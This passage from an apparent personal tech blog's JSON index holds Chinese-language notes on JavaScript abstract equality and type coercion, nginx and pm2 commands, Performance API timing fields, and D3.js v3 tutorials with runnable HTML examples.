原理","slug":"JavaScript-原理","permalink":"https://xuxb.github.io/tags/JavaScript-%E5%8E%9F%E7%90%86/"}]},{"title":"隐式转换与抽象相等","slug":"JavaScript/隐式转换与抽象相等","date":"2021-04-27T09:24:48.000Z","updated":"2021-04-29T10:48:12.022Z","comments":true,"path":"2021/04/27/JavaScript/隐式转换与抽象相等/","link":"","permalink":"https://xuxb.github.io/2021/04/27/JavaScript/%E9%9A%90%E5%BC%8F%E8%BD%AC%E6%8D%A2%E4%B8%8E%E6%8A%BD%E8%B1%A1%E7%9B%B8%E7%AD%89/","excerpt":"","text":"隐式转换与抽象相等对象和非对象之间的相等比较关于对象（对象 / 函数 / 数组）和标量基本类型（字符串 / 数字 / 布尔值）之间的相等比较，ES5 规范 11.9.3.8-9 做如下规定：(1) 如果 Type(x) 是字符串或数字，Type(y) 是对象，则返回 x == ToPrimitive(y) 的结果；(2) 如果 Type(x) 是对象，Type(y) 是字符串或数字，则返回 ToPromitive(x) == y 的结果。 == 抽象相等隐式转换规则 如果两个值的类型相同，不用发生类型转换，就使用 === 来判断 在比较两个不同类型的值时会发生隐式强制类型转换 如果是对象与非对象之间的相等比较，则 对象先调用 valueOf() 用来比较 valueOf() 返回值不是基本类型时，再调用 toString() 转换成基本数据类型 如果是其他类型和布尔类型之间的相等比较，则将布尔类型转换为数字 如果是字符串和数字之间的相等比较，则将字符串转换为数字 其他类型与 boolean 类型之间的相等比较 如果 Type(x) 是布尔类型，则返回 ToNumber(x) == y 的结果； 如果 Type(y) 是布尔类型，则返回 x == ToNumber(y) 的结果。 number 和 string 之间的相等比较 如果 Type(x) 是数字，Type(y) 是字符串，则返回 x == ToNumber(y) 的结果。 如果 Type(x) 是字符串，Type(y) 是数字，则返回 ToNumber(x) == y 的结果。 null 和 undefined 之间的相等比较说明：null 与 undefined 是抽象相等的，但与其他所有的值都不等 如果 x 为 null，y 为 undefined，则结果为 true。 如果 x 为 undefined，y 为 null，则结果为 true。 123null == undefined // truenull == &#x27;&#x27; // falseundefined == 0 // false == 抽象相等总结 a、b 进行比较时，如果存在对象类型，则先调用 valueOf()，否则调用 toString() 转换成基本数据类型 a、b 进行比较时，如果 a 与 b 是 Number, String, Boolean 这三种类型中的一种，则都转换成数字后再进行比较 如果存在 null 或 undefined 时，必须等式左右两边都为 null 或 undefined，否则不肯能相等 1234567891042 == true // false42 == false // false&#x27;0&#x27; == false // true&#x27;&#x27; == false // true&#x27;&#x27; == 0 // true&#x27;&#x27; == [] // true0 == &#123;&#125;; // false -- Number((&#123;&#125;).toString()) 值为 NaN[] == ![] // true2 == [2]; // true&#x27;&#x27; == [null]; // true -- Number(([null]).toString()) 值为 0 为什么 [] == false 成立？ 第一步：[] 先调用 valueOf() 方法， 相当于 [].valueOf() == false，而 [].valueOf() === []，即判断 [] == false 第二部：[] 再调用 toString() 方法，相当于 [].toString() == false，而 [].toString() === &#39;&#39;，即判断 &#39;&#39; == false 第三部：&#39;&#39; 使用 ToNumber() 方法，而 Number(&#39;&#39;) === 0 第四部：false 使用 ToNumber() 方法，而 Number(false) === 0 式子两边左右都为 0 , 所以 [] == false 成立","categories":[{"name":"JavaScript","slug":"JavaScript","permalink":"https://xuxb.github.io/categories/JavaScript/"}],"tags":[{"name":"JavaScript 原理","slug":"JavaScript-原理","permalink":"https://xuxb.github.io/tags/JavaScript-%E5%8E%9F%E7%90%86/"}]},{"title":"nginx 常用命令","slug":"杂项/nginx 常用命令","date":"2021-04-27T09:22:48.000Z","updated":"2021-04-27T09:43:09.659Z","comments":true,"path":"2021/04/27/杂项/nginx 常用命令/","link":"","permalink":"https://xuxb.github.io/2021/04/27/%E6%9D%82%E9%A1%B9/nginx%20%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4/","excerpt":"","text":"nginx 常用命令 sudo nginx // 启动 nginx sudo nginx -s reload // 重启 nginx sudo nginx -s stop // 关闭 nginx ps -ef | grep nginx // 查看查看nginx进程 sudo kill -TERM 主进程号 // 杀死进程 linux 常用命令 cp [-r] rm open pwd clear reset","categories":[{"name":"杂项","slug":"杂项","permalink":"https://xuxb.github.io/categories/%E6%9D%82%E9%A1%B9/"}],"tags":[{"name":"server","slug":"server","permalink":"https://xuxb.github.io/tags/server/"},{"name":"nginx","slug":"nginx","permalink":"https://xuxb.github.io/tags/nginx/"}]},{"title":"Performance API","slug":"浏览器/Performance API","date":"2021-04-27T09:21:48.000Z","updated":"2021-04-27T09:43:15.644Z","comments":true,"path":"2021/04/27/浏览器/Performance API/","link":"","permalink":"https://xuxb.github.io/2021/04/27/%E6%B5%8F%E8%A7%88%E5%99%A8/Performance%20API/","excerpt":"","text":"Performance APIperformance.timingperformance对象是全局的，它的 timing 属性是一个对象，它包含了各种与浏览器性能有关的时间数据，提供浏览器处理网页各个阶段的耗时。 performance.timing对象包含下列属性（全部只读）： navigationStart：当前浏览器窗口的前一个网页关闭，发生unload事件时的Unix毫秒时间戳。如果没有前一个网页，则等于fetchStart属性。 unloadEventStart：如果前一个网页与当前网页属于同一个域名，则返回前一个网页的unload事件发生时的Unix毫秒时间戳。如果没有前一个网页，或者之前的网页跳转不是在同一个域名内，则返回值为0。 *unloadEventEnd**：如果前一个网页与当前网页属于同一个域名，则返回前一个网页unload事件的回调函数结束时的Unix毫秒时间戳。如果没有前一个网页，或者之前的网页跳转不是在同一个域名内，则返回值为0。 *redirectStart**：返回第一个HTTP跳转开始时的Unix毫秒时间戳。如果没有跳转，或者不是同一个域名内部的跳转，则返回值为0。 redirectEnd：返回最后一个HTTP跳转结束时（即跳转回应的最后一个字节接受完成时）的Unix毫秒时间戳。如果没有跳转，或者不是同一个域名内部的跳转，则返回值为0。 fetchStart：返回浏览器准备使用HTTP请求读取文档时的Unix毫秒时间戳。该事件在网页查询本地缓存之前发生。 domainLookupStart：返回域名查询开始时的Unix毫秒时间戳。如果使用持久连接，或者信息是从本地缓存获取的，则返回值等同于fetchStart属性的值。 domainLookupEnd：返回域名查询结束时的Unix毫秒时间戳。如果使用持久连接，或者信息是从本地缓存获取的，则返回值等同于fetchStart属性的值。 connectStart：返回HTTP请求开始向服务器发送时的Unix毫秒时间戳。如果使用持久连接（persistent connection），则返回值等同于fetchStart属性的值。 connectEnd：返回浏览器与服务器之间的连接建立时的Unix毫秒时间戳。如果建立的是持久连接，则返回值等同于fetchStart属性的值。连接建立指的是所有握手和认证过程全部结束。 secureConnectionStart：返回浏览器与服务器开始安全链接的握手时的Unix毫秒时间戳。如果当前网页不要求安全连接，则返回0。 requestStart：返回浏览器向服务器发出HTTP请求时（或开始读取本地缓存时）的Unix毫秒时间戳。 responseStart：返回浏览器从服务器收到（或从本地缓存读取）第一个字节时的Unix毫秒时间戳。 responseEnd：返回浏览器从服务器收到（或从本地缓存读取）最后一个字节时（如果在此之前HTTP连接已经关闭，则返回关闭时）的Unix毫秒时间戳。 domLoading：返回当前网页DOM结构开始解析时（即Document.readyState属性变为“loading”、相应的readystatechange事件触发时）的Unix毫秒时间戳。 domInteractive：返回当前网页DOM结构结束解析、开始加载内嵌资源时（即Document.readyState属性变为“interactive”、相应的readystatechange事件触发时）的Unix毫秒时间戳。 domContentLoadedEventStart：返回当前网页DOMContentLoaded事件发生时（即DOM结构解析完毕、所有脚本开始运行时）的Unix毫秒时间戳。 domContentLoadedEventEnd：返回当前网页所有需要执行的脚本执行完成时的Unix毫秒时间戳。 domComplete：返回当前网页DOM结构生成时（即Document.readyState属性变为“complete”，以及相应的readystatechange事件发生时）的Unix毫秒时间戳。 loadEventStart：返回当前网页load事件的回调函数开始时的Unix毫秒时间戳。如果该事件还没有发生，返回0。 loadEventEnd：返回当前网页load事件的回调函数运行结束时的Unix毫秒时间戳。如果该事件还没有发生，返回0。 关键指标数据如下： DNS解析时间：domainLookupEnd - domainLookupStart TCP建立连接：connectEnd - connectStart 发送请求：responseStart - requestStart 接收请求：responseEnd - responseStart TTFB：responseStart - fetchStart 白屏时间：domLoading - fetchStart 解析 DOM 树：domInteractive - domLoading 首次可交互时间：domContentLoadedEventEnd - fetchStart （粗略计算） DOM Ready 时间：domComplete - fetchStart 页面完全加载时间：loadEventStart - fetchStart DOMContentLoaded 事件耗时：domContentLoadedEventEnd - domContentLoadedEventStart DOMLoad 事件耗时：loadEventEnd - loadEventStart","categories":[{"name":"浏览器","slug":"浏览器","permalink":"https://xuxb.github.io/categories/%E6%B5%8F%E8%A7%88%E5%99%A8/"}],"tags":[{"name":"Performance","slug":"Performance","permalink":"https://xuxb.github.io/tags/Performance/"},{"name":"性能","slug":"性能","permalink":"https://xuxb.github.io/tags/%E6%80%A7%E8%83%BD/"}]},{"title":"pm2 常用命令","slug":"杂项/pm2 常用命令","date":"2021-04-27T09:21:48.000Z","updated":"2021-04-27T11:59:27.247Z","comments":true,"path":"2021/04/27/杂项/pm2 常用命令/","link":"","permalink":"https://xuxb.github.io/2021/04/27/%E6%9D%82%E9%A1%B9/pm2%20%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4/","excerpt":"","text":"pm2 常用命令1、node守护进程比较node 守护进程比较 nodemon：开发环境使用，修改后自动重启。 forever：管理多个站点，每个站点访问量不大，不需要监控。 pm2：网站访问量比较大，需要完整的监控界面。 pm2主要特性 内建负载均衡（使用Node cluster 集群模块） 后台运行 0 秒停机重载 开机自启动脚本 停止不稳定的进程（避免无限循环） 控制台检测 提供远程控制和实时的接口API (允许和PM2进程管理器交互) pm2 常用命令1. 安装npm install -g pm2 2. 单个启动pm2 start app.js # 启动pm2 start app.js -i 4 # 启动4个应用实例，自动负载均衡 pm2 start app.js --watch # 监听文件变化并重启 3. 批量重启使用 pm2 ecosystem 或 pm2 init 会生成 ecosystem.config.js 文件 然后运行 pm2 start ecosystem.config.js --env dev 123456789101112131415161718192021module.exports = &#123; apps : [&#123; name: &#x27;app&#x27;, script: &#x27;./app.js&#x27;, env_dev: &#123; NODE_ENV: &#x27;dev&#x27;, // 环境参数，当前指定为生产环境 process.env.NODE_ENV REMOTE_ADDR: &#x27;https://www.test.com&#x27;, &#125;, env_sit: &#123; NODE_ENV: &#x27;sit&#x27;, REMOTE_ADDR: &#x27;https://www.test.com&#x27;, &#125;, env_prod: &#123; NODE_ENV: &#x27;prod&#x27;, REMOTE_ADDR: &#x27;https://www.test.com&#x27;, &#125;, &#125;, &#123; name: &#x27;worker&#x27;, script: &#x27;worker.js&#x27; &#125;]&#125; 4. 重启pm2 restart app_id | app_name # 重启pm2 restart all # 重启所有进程，相当stop+startpm2 reload all # 0秒停机重载进程 (用于不间断进程) 5. 停止pm2 stop app_id | app_name # 重启pm2 stop all # 重启所有进程，相当stop+start 6. 删除pm2 delete app_id | app_name # 从列表中删除指定的进程pm2 delete all # 从列表中删除全部进程pm2 kill # 杀死守护进程 7. 查看pm2 list # 查看进程pm2 logs # 查看日志pm2 show app_name|app_id # 查看进程详情pm2 monit # 查看CPU和内存资源占用 8. 启动 HTTP 服务pm2 serve|expose [options] [path] [port] 例如 pm2 serve ./dist 8888，在 dist 目录启动 http 服务，端口号为 8888","categories":[{"name":"杂项","slug":"杂项","permalink":"https://xuxb.github.io/categories/%E6%9D%82%E9%A1%B9/"}],"tags":[{"name":"server","slug":"server","permalink":"https://xuxb.github.io/tags/server/"},{"name":"node","slug":"node","permalink":"https://xuxb.github.io/tags/node/"}]},{"title":"可视化交互","slug":"D3.js/可视化交互","date":"2021-03-23T16:00:00.000Z","updated":"2021-04-28T02:31:14.932Z","comments":true,"path":"2021/03/24/D3.js/可视化交互/","link":"","permalink":"https://xuxb.github.io/2021/03/24/D3.js/%E5%8F%AF%E8%A7%86%E5%8C%96%E4%BA%A4%E4%BA%92/","excerpt":"","text":"可视化交互1、事件类型 鼠标事件 click 单击 dbclick 双击 mousemove 鼠标移动 mouseenter 鼠标进入 mouseleave 鼠标离开 mouseover 鼠标滑入 mouseout 鼠标滑出 mousedown 鼠标按下 mouseup 鼠标弹起 触摸事件 touchstart 触摸点在屏幕上接触时 touchmove 触摸点在屏幕上移动时 touchend 触摸点在屏幕上移开时 缩放、平移事件 d3.behavior.zoom d3.behavior.zoom 创建一个缩放行为 zoom(selection) 将此缩放行为应用到 selection 上（一般使用 selection.call(zoom)） zoom.on(type, listener) 设置事件类型和监听器 zoomstart 缩放开始时 zoom 缩放中 zoomend 缩放结束时 zoom.scaleExtent() 设置缩放的最小、最大值，默认为 [0, +∞] zoom.scale() 设置初始的缩放大小 zoom.translate() 设置当前缩放的平移向量，默认为 [0, 0] zoom.duration() 取得或设置双击事件的过渡持续的时间 zoom.x() 设置 X轴 方向的比例尺 zoom.y() 设置 Y轴 方向的比例尺 拖拽事件 d3.behavior.drag d3.behavior.darg 创建一个拖拽行为 darg(selection) 将此拖拽行为应用到 selection 上（一般使用 selection.call(darg)） darg.on(type, listener) 设置事件类型和监听器 dargstart 拖拽开始时 darg 拖拽中 dargend 拖拽结束时 dray.origin() 设置拖动行为的原点 2、事件对象 d3.event说明 d3.evnet 对象是 DOM 事件，并实现了标准事件字段 event.x: 相对于可视区的坐标（与 event.clientX 一样） event.clientX: 相对于可视区的坐标（与滚动的距离无关，以浏览器左上角为基准） event.offsetX: 相对于容器的坐标（鼠标与触发事件的元素的距离） event.pageX: 鼠标位置相对于文档的坐标（包含滚动的距离，以文档左上角为基准） event.screenX: 鼠标位置相对于屏幕 X 轴的坐标（与滚动的距离无关，以屏幕左上角为基准） event.translate: 返回鼠标位移的数据，如 [100, 20] event.scale: 返回鼠标缩放的大小，如 1.2 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475&lt;!DOCTYPE html&gt;&lt;html lang=&quot;en&quot;&gt;&lt;head&gt; &lt;meta charset=&quot;UTF-8&quot;&gt; &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1.0&quot;&gt; &lt;meta http-equiv=&quot;X-UA-Compatible&quot; content=&quot;ie=edge&quot;&gt; &lt;title&gt;Document&lt;/title&gt; &lt;style&gt; .circle-item &#123; fill: none; stroke: #090; stroke-width: 4; &#125; &lt;/style&gt;&lt;/head&gt;&lt;body&gt; &lt;script src=&quot;http://d3js.org/d3.v3.js&quot; charset=&quot;utf-8&quot;&gt;&lt;/script&gt; &lt;script&gt; let w = document.documentElement.clientWidth; let h = document.documentElement.clientHeight; let svg = d3.select(&#x27;body&#x27;) .append(&#x27;svg&#x27;) .attr(&#x27;width&#x27;, w) .attr(&#x27;height&#x27;, h); svg.append(&#x27;text&#x27;) .attr(&#x27;x&#x27;, 10) .attr(&#x27;y&#x27;, 24) .attr(&#x27;class&#x27;, &#x27;mouse-info&#x27;); function updateInfo(str) &#123; svg.select(&#x27;.mouse-info&#x27;).text(str); &#125; svg.on(&#x27;mousemove&#x27;, () =&gt; &#123; let event = d3.event; let str = `x ：$&#123;event.offsetX&#125; \\n Y: $&#123;event.offsetY&#125;`; updateInfo(str); &#125;); svg.on(&#x27;click&#x27;, function () &#123; let event = d3.event; console.log(event); let x = event.offsetX; let y = event.offsetY; let data = [1, 2, 3, 4]; svg.selectAll(&#x27;cirle&#x27;) .data(data) .enter() .append(&#x27;circle&#x27;) .attr(&#x27;class&#x27;, &#x27;circle-item&#x27;) .attr(&#x27;cx&#x27;, x) .attr(&#x27;cy&#x27;, y) .attr(&#x27;r&#x27;, 0) .transition() .duration(2000) .delay((d, i) =&gt; Math.pow(i + 1, 2) * 100) .ease(&#x27;ease-out&#x27;) .attr(&#x27;r&#x27;, 500) .style(&#x27;stroke-width&#x27;, 1) .style(&#x27;opacity&#x27;, 0) .each(&#x27;end&#x27;, function () &#123; d3.select(this).remove(); &#125;); &#125;); &lt;/script&gt;&lt;/body&gt;&lt;/html&gt; 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970&lt;!DOCTYPE html&gt;&lt;html lang=&quot;en&quot;&gt;&lt;head&gt; &lt;meta charset=&quot;UTF-8&quot;&gt; &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1.0&quot;&gt; &lt;meta http-equiv=&quot;X-UA-Compatible&quot; content=&quot;ie=edge&quot;&gt; &lt;title&gt;Document&lt;/title&gt; &lt;style&gt; .circle-item &#123; opacity: .5; &#125; &lt;/style&gt;&lt;/head&gt;&lt;body&gt; &lt;script src=&quot;http://d3js.org/d3.v3.js&quot; charset=&quot;utf-8&quot;&gt;&lt;/script&gt; &lt;script&gt; let w = 800; let h = 600; let r = 60; let data = [&#123; x: w / 2 - r, y: w / 2 - r &#125;, &#123; x: w / 2 - r, y: w / 2 + r &#125;, &#123; x: w / 2 + r, y: w / 2 - r &#125;, &#123; x: w / 2 + r, y: w / 2 + r &#125;]; function dragHandler() &#123; let event = d3.event; d3.select(this) .attr(&#x27;transform&#x27;, `translate($&#123;event.x&#125;, $&#123;event.y&#125;)`); &#125; let drag = d3.behavior.drag().on(&#x27;drag&#x27;, dragHandler); let color = d3.scale.category10(); let svg = d3.select(&#x27;body&#x27;) .append(&#x27;svg&#x27;) .attr(&#x27;width&#x27;, w) .attr(&#x27;height&#x27;, h); let container = svg.append(&#x27;g&#x27;) .attr(&#x27;class&#x27;, &#x27;container&#x27;); container.selectAll(&#x27;circle&#x27;) .data(data) .enter() .append(&#x27;circle&#x27;) .attr(&#x27;class&#x27;, &#x27;circle-item&#x27;) .attr(&#x27;transform&#x27;, d =&gt; `translate($&#123;d.x&#125;, $&#123;d.y&#125;)`) .attr(&#x27;r&#x27;, 60) .style(&#x27;fill&#x27;, (d, i) =&gt; color(i)) .call(drag); &lt;/script&gt;&lt;/body&gt;&lt;/html&gt; 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970&lt;!DOCTYPE html&gt;&lt;html lang=&quot;en&quot;&gt;&lt;head&gt; &lt;meta charset=&quot;UTF-8&quot;&gt; &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1.0&quot;&gt; &lt;meta http-equiv=&quot;X-UA-Compatible&quot; content=&quot;ie=edge&quot;&gt; &lt;title&gt;Document&lt;/title&gt; &lt;style&gt; .circle-item &#123; fill: #090; &#125; &lt;/style&gt;&lt;/head&gt;&lt;body&gt; &lt;script src=&quot;http://d3js.org/d3.v3.js&quot; charset=&quot;utf-8&quot;&gt;&lt;/script&gt; &lt;script&gt; let w = 800; let h = 600; let r = 60; let data = [&#123; x: w / 2 - r, y: w / 2 - r &#125;, &#123; x: w / 2 - r, y: w / 2 + r &#125;, &#123; x: w / 2 + r, y: w / 2 - r &#125;, &#123; x: w / 2 + r, y: w / 2 + r &#125;]; function zoomHandler () &#123; let event = d3.event; d3.select(&#x27;.container&#x27;) .attr(&#x27;transform&#x27;, `translate($&#123;event.translate&#125;) scale($&#123;event.scale&#125;)`); &#125; let zoom = d3.behavior.zoom() .scaleExtent([1, 10]) .on(&#x27;zoom&#x27;, zoomHandler); let svg = d3.select(&#x27;body&#x27;) .append(&#x27;svg&#x27;) .attr(&#x27;width&#x27;, w) .attr(&#x27;height&#x27;, h) .call(zoom); let container = svg.append(&#x27;g&#x27;) .attr(&#x27;class&#x27;, &#x27;container&#x27;); container.selectAll(&#x27;circle&#x27;) .data(data) .enter() .append(&#x27;circle&#x27;) .attr(&#x27;class&#x27;, &#x27;circle-item&#x27;) .attr(&#x27;transform&#x27;, d =&gt; `translate($&#123;d.x&#125;, $&#123;d.y&#125;)`) .attr(&#x27;r&#x27;, 60); &lt;/script&gt;&lt;/body&gt;&lt;/html&gt;","categories":[{"name":"D3.js","slug":"D3-js","permalink":"https://xuxb.github.io/categories/D3-js/"}],"tags":[{"name":"D3.js","slug":"D3-js","permalink":"https://xuxb.github.io/tags/D3-js/"}]},{"title":"坐标轴","slug":"D3.js/坐标轴","date":"2021-03-23T16:00:00.000Z","updated":"2021-04-28T02:31:25.108Z","comments":true,"path":"2021/03/24/D3.js/坐标轴/","link":"","permalink":"https://xuxb.github.io/2021/03/24/D3.js/%E5%9D%90%E6%A0%87%E8%BD%B4/","excerpt":"","text":"坐标轴说明：使用 let axis = d3.svg.axis() 生成坐标轴 坐标轴上所有的文字、线段都以轴最外面的元素 g 为标准进行布局，并设置 g 元素的 transform: tanslate(x, y)（如果没有 g 元素，则会以根元素 svg 为标准） axis(selection)： 将轴绘制在选择集上，一般是添加到 g 元素上，与 selection.call(axis) 的功能一样 axis.orient(orientation)： orientation 参数设置坐标轴方向 ，并返回轴（可选值为 bottom、top、left、right，默认为 bottom） axis.tickValues(arr): 指定的数值将用于刻度中的文本 axis.ticks(num)：num 参数设置或获取（当参数为空时）坐标轴刻度的个数 axis.innerTickSize(size)：size 参数设置或获取（当参数为空时）内部坐标轴刻度线的长度（px） axis.outerTickSize(size)：size 参数设置或获取（当参数为空时）外部坐标轴刻度线的长度（px） axis.tickSize(inner, outer)：设定或获取坐标轴内外刻度线的长度 axis.tickPadding(padding): padding 参数设置刻度线与文本间的距离 axis.tickFormat(fn): 格式化显示在坐标轴上的数据 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102&lt;!DOCTYPE html&gt;&lt;html lang=&quot;en&quot;&gt;&lt;head&gt; &lt;meta charset=&quot;UTF-8&quot;&gt; &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1.0&quot;&gt; &lt;meta http-equiv=&quot;X-UA-Compatible&quot; content=&quot;ie=edge&quot;&gt; &lt;title&gt;D3.js - 坐标轴&lt;/title&gt; &lt;style&gt; .container &#123; border: 1px solid #999; &#125; .rect-background &#123; fill: #ddd; &#125; .axis path &#123; display: none; &#125; .axis line &#123; fill: none; stroke: #fff; shape-rendering: crispEdges; &#125; .axis text &#123; font-family: sans-serif; font-size: 12px; &#125; &lt;/style&gt;&lt;/head&gt;&lt;body&gt; &lt;script src=&quot;http://d3js.org/d3.v3.js&quot; charset=&quot;utf-8&quot;&gt;&lt;/script&gt; &lt;script&gt; let w = 960; let h = 600; let padding = 40; let xData = [-450, 450]; let yData = [-250, 250]; let svg = d3.select(&#x27;body&#x27;) .append(&#x27;svg&#x27;) .attr(&#x27;class&#x27;, &#x27;container&#x27;) .attr(&#x27;width&#x27;, w) .attr(&#x27;height&#x27;, h); let xScale = d3.scale.linear() .domain(xData) .range([0, w - padding * 2]); let yScale = d3.scale.linear() .domain(yData) .range([0, h - padding * 2]); let xAxis = d3.svg.axis() .scale(xScale) .orient(&#x27;bottom&#x27;) .tickSize(-h); let yAxis = d3.svg.axis() .scale(yScale) .orient(&#x27;left&#x27;) .tickSize(-w) .ticks(5); function zoomed() &#123; svg.select(&#x27;.x-axis&#x27;).call(xAxis); svg.select(&#x27;.y-axis&#x27;).call(yAxis); &#125; let zoom = d3.behavior.zoom() .x(xScale) .y(yScale) .scaleExtent([1, 3]) .on(&#x27;zoom&#x27;, zoomed); svg.append(&#x27;g&#x27;) .attr(&#x27;transform&#x27;, `translate($&#123;padding&#125;, $&#123;padding&#125;)`) .append(&#x27;rect&#x27;) .attr(&#x27;class&#x27;, &#x27;rect-background&#x27;) .attr(&#x27;width&#x27;, w - padding * 2) .attr(&#x27;height&#x27;, h - padding * 2); svg.append(&#x27;g&#x27;) .attr(&#x27;class&#x27;, &#x27;axis x-axis&#x27;) .attr(&#x27;transform&#x27;, `translate($&#123;padding&#125;, $&#123;h - padding&#125;)`) .call(xAxis); svg.append(&#x27;g&#x27;) .attr(&#x27;class&#x27;, &#x27;axis y-axis&#x27;) .attr(&#x27;transform&#x27;, `translate($&#123;padding&#125;, $&#123;padding&#125;)`) .call(yAxis); svg.select(&#x27;.rect-background&#x27;).call(zoom); &lt;/script&gt;&lt;/body&gt;&lt;/html&gt;","categories":[{"name":"D3.js","slug":"D3-js","permalink":"https://xuxb.github.io/categories/D3-js/"}],"tags":[{"name":"D3.js","slug":"D3-js","permalink":"https://xuxb.github.io/tags/D3-js/"}]},{"title":"工具函数","slug":"D3.js/工具函数","date":"2021-03-23T16:00:00.000Z","updated":"2021-04-28T02:30:58.469Z","comments":true,"path":"2021/03/24/D3.js/工具函数/","link":"","permalink":"https://xuxb.github.io/2021/03/24/D3.js/%E5%B7%A5%E5%85%B7%E5%87%BD%E6%95%B0/","excerpt":"","text":"工具函数数组 d3.range([start, ]stop[, step]): 生成一个包含算数级数的数组 d3.shuffle(): 随机化一个数组的顺序 d3.sum(): 计算数字数组的和 时间格式化 d3.time.format123var date = new Date();var formatter = d3.time.format(&#x27;%Y-%m-%d %H:%M:%S&#x27;);formatter(date); // 2018-01-26 16:38:05 %j：在本年中的天数 [001, 366]%y：不含纪元的年份 [00, 99]%Y：包含纪年的4位数年份%d：在本月的天数， 不足2位用0补全 [01, 31]%e：在本月的天数， 不足2位用空格补全 [ 1, 31]%m：月份 [01, 12]%b：月的缩写 // Jan%B：月的全称 // January%H：小时， 24小时制 [00, 23]%I：小时， 12小时制 [01, 12]%M：分钟 [00, 59]%S：秒 [00, 60]%L：毫秒 [000, 999]%a：星期的缩写 // Thu%A：星期的全称 // Thursday%p：AM或PM%x：日期部分， 等同于 %m%d%Y%X：时间部分， 等同于 %H:%M:%S 颜色序数比例尺 d3.scale.category10构造一个新的序数比例尺，使用以下 10（20）种颜色 d3.scale.category10() d3.scale.category20() d3.scale.category20b() d3.scale.category20c() 说明：该比例尺有默认的值域包含 10 中颜色，但并没有设置范围域。传递给比例尺函数的每个唯一值将从输出范围中分配一个新值。 123456789var scale = d3.scale.category10();scale(0); // #1f77b4scale(1); // #ff7f0escale(10); // #2ca02cscale.domain(); // [0, 1, 10]scale(10); // #2ca02cscale(15); // #d62728scale.domain(); // [0, 1, 10, 15]scale.range(); // [&quot;#1f77b4&quot;, &quot;#ff7f0e&quot;, &quot;#2ca02c&quot;, &quot;#d62728&quot;, &quot;#9467bd&quot;, &quot;#8c564b&quot;, &quot;#e377c2&quot;, &quot;#7f7f7f&quot;, &quot;#bcbd22&quot;, &quot;#17becf&quot;]","categories":[{"name":"D3.js","slug":"D3-js","permalink":"https://xuxb.github.io/categories/D3-js/"}],"tags":[{"name":"D3.js","slug":"D3-js","permalink":"https://xuxb.github.io/tags/D3-js/"}]},{"title":"update、enter 与 exit","slug":"D3.js/update、enter 与 exit","date":"2021-03-23T16:00:00.000Z","updated":"2021-04-28T02:31:29.128Z","comments":true,"path":"2021/03/24/D3.js/update、enter 与 exit/","link":"","permalink":"https://xuxb.github.io/2021/03/24/D3.js/update%E3%80%81enter%20%E4%B8%8E%20exit/","excerpt":"","text":"update、enter 与 exit作用：处理选择集和数据集关系不确定的情况，对各种选择集分别作处理。 selection.data() 操作返回的是三个 Virtual selection，这三个 Virtual selection 是 enter、 update 以及 exit。 假设用三个 &lt;p&gt; 元素的选择集（对应的数据分别为 [0, 1, 2]）， 如果将新数据集 [3, 6, 9, 12, 15] 绑定到选择集上，则前三个数据（3，6，9）有与之对应的元素，这部分成为 Update而后面两个数据（12，15）没有与之对应的元素，这部分成为 Enter 如果将新数据集 [4, 6] 绑定到选择集上，则前两个数据（4，6）有与之对应的元素，这部分成为 Update而原来选择集最后一个数据（2）没有与之对应的元素，这部分成为 Exit ** update、enter、exit的区别** d3.selectAll(&#39;text&#39;) 的返回值是一个选择集，返回的是当前 DOM 的信息d3.selectAll(&#39;text&#39;).data(dataSet) 的返回值是一个选择集，有 enter()、exit() 方法，返回的是绑定前后对比的信息 update: 表示在 DOM 中即将被更新的选择集，update 部分的处理办法一般是：更新属性值，如 let updateSelection = svg.selectAll(&#39;circle&#39;).data(dataSet) enter: 表示在 DOM 中即将被添加的选择集，enter 部分的处理办法一般是：添加元素后，赋予属性值，如 let enterSelection = svg.selectAll(&#39;circle&#39;).data(dataSet).enter() exit: 表示在 DOM 中即将被删除的选择集，exit 部分的处理办法一般是：修改属性值，删除元素，如 let exitSelection = svg.selectAll(&#39;circle&#39;).data(dataSet).exit() 说明：并没有 svg.selectAll(&#39;circle&#39;).data(dataSet).update() 方法，svg.selectAll(&#39;circle&#39;).data(dataSet) 直接返回 Update 选择集（） 比较的是数据集与选择集，而不是比较数据集与选择集中的数据（与 Vue 中的 key 属性、DOM元素复用没有任何联系） 当有通过数据更新视图时，正确的顺序应该是 update() 、enter()、exit() 重新将数据绑定到选择集上时，不可能同时存在 enter()、exit() 对于数组中的数据元素，如果缺少与之对应的 DOM 元素，那么就会有一个占位符来顶替，而 enter() 方法返回的就是这些占位符集合的引用。这个引用后只能链接 append()，insert() 以及 select() 操作符，通过他们来操作该引用所指向的集合。 data() 数据绑定（selection.selectAll().data().enter().append()） let selectoin = svg.selectAll(&#39;circle&#39;) 因为 SVG 容器是空的，返回一个新的空选择 selection。 enterSelectoin = selection.data(dataSet) 将这个选择连接到一组数据，产生三个新的选择，代表三种可能的状态：enter、update 和 exit。由于选择是空的，所以update 和 exit 的 selection 是空的，而 enter 的 selection 包含每个新基准的占位符。 selection.data(dataSet) 返回更新选择，selection.enter() 返回 enter 选择，而进入和退出选择被挂起 。 enterSelectoin.append() 将缺失的元素添加到 SVG 容器中，这会为每个数据附加一个新的 circle 到 SVG 容器。 当把数据分配到一个元素上时，这个数据被存储到该元素的 _data_ 属性中, 数据可以通过 _data_ 属性被再选。这也就是我们所说的数据绑定到 DOM 元素 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475&lt;!DOCTYPE html&gt;&lt;html lang=&quot;en&quot;&gt;&lt;head&gt; &lt;meta charset=&quot;UTF-8&quot;&gt; &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1.0&quot;&gt; &lt;meta http-equiv=&quot;X-UA-Compatible&quot; content=&quot;ie=edge&quot;&gt; &lt;title&gt;D3.js - enter、update、exit&lt;/title&gt; 